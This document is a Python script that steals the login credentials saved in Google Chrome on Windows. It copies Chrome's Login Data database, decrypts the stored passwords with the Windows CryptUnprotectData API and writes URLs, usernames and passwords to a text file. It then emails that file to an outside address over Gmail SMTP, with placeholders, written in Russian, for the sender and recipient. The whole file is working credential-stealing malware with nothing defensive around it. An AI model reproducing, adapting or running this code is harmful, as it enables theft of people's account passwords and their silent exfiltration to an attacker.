import os, sqlite3, win32crypt, time, shutil, sys           # import the necessary libraries
import smtplib                                              
import mimetypes                                            # Importing a class to handle unknown MIME types based on file extension
from email import encoders                                  
from email.mime.base import MIMEBase                       
from email.mime.text import MIMEText                        
from email.mime.multipart import MIMEMultipart              

file = open("passdump.txt", "w")
file.write("")
file.close
def logit(content):
    file = open("passdump.txt", "a")
    file.write(content)
    file.close
shutil.copyfile(os.path.expanduser('~')+"/AppData/Local/Google/Chrome/User Data/Default/Login Data", "tempdatabase")
path = os.path.expanduser('~')+"/AppData/Local/Google/Chrome/User Data/Default"
crdb = os.path.join(os.path.abspath(os.path.split(sys.argv[0])[0]) + "/tempdatabase")
c = sqlite3.connect(crdb)
cursor = c.cursor()
select_statement = "SELECT origin_url, username_value, password_value FROM logins"
cursor.execute(select_statement)
login_data = cursor.fetchall()
outputlist = []
for url, user_name, pwd, in login_data:
    pwd = win32crypt.CryptUnprotectData(pwd, None, None, None, 0)
    if url != "" and user_name != "" and pwd[1].decode('utf-8') != "":
        outputlist.append(url)
        outputlist.append(user_name)
        outputlist.append(pwd[1].decode('utf-8'))
        outputlist.append("")  
for item in outputlist:
    try:
        logit(item + "\n")
    except:
        doing = "---nothing------"      
c.close()
os.remove(os.path.abspath(os.path.split(sys.argv[0])[0]) + "\\tempdatabase")

def send_email(addr_to, msg_subj, msg_text, files):
    addr_from = "Адрес_почты-отправителя"                       # Sender(Your email-address)
    password  = "Ваш_пароль_от_почты"                           # Your password

    msg = MIMEMultipart()                                   # Creating message
    msg['From']    = addr_from                              # Sender
    msg['To']      = addr_to                                # Recipient(Can be your e-mail too)
    msg['Subject'] = msg_subj                               # Subject of message

    body = msg_text                                         # Body of message
    msg.attach(MIMEText(body, 'plain'))                     # Add text to the body of message

    process_attachement(msg, files)

    #======== This block is configured for each e-mail provider separately. ===============================================
    server = smtplib.SMTP('smtp.gmail.com', 587)        # Creating an SMTP Object
    server.starttls()                                   # Start encrypted exchange over TLS
    server.login(addr_from, password)                   # Log-in to your mail with your credentials
    server.send_message(msg)                            # Sending message
    server.quit()                                       # exit
    #==========================================================================================================================
    
def process_attachement(msg, files):                        # Function for processing the list of files added to the message
    for f in files:
        if os.path.isfile(f):                               # If the file exists
            attach_file(msg,f)                              # Adding the file to the message
        elif os.path.exists(f):                             # If the path is not a file and exists, then it is folder
            dir = os.listdir(f)                             # Get a list of files in the folder
            for file in dir:                                # Go through all the files and...
                attach_file(msg,f+"/"+file)                 # ...add each file to the message

def attach_file(msg, filepath):                             # Function to add a specific file to a message
    filename = os.path.basename(filepath)                   # Get only the file name
    ctype, encoding = mimetypes.guess_type(filepath)        # Determine the file type based on its extension
    if ctype is None or encoding is not None:               # If the file type is not detected
        ctype = 'application/octet-stream'                  # We will use the general type
    maintype, subtype = ctype.split('/', 1)                 # Get the type and subtype
    if maintype == 'text':                                  # If the text file
        with open(filepath) as fp:                          # Opening the file for reading
            file = MIMEText(fp.read(), _subtype=subtype)    # Using the MIMEText type
            fp.close()                                      # After using the file, closing it
    file.add_header('Content-Disposition', 'attachment', filename=filename) # Adding headers
    msg.attach(file)                                        # Attaching the file to the message

addr_to   = "Адрес_почты-получателя"                                # Recipient (you can specify the same mail as in the sender to send mail to yourself)
files = ['passdump.txt']                                       # Sending a text file with passwords passdump.txt
send_email(addr_to, "Тема сообщения", "Текст сообщения", files)
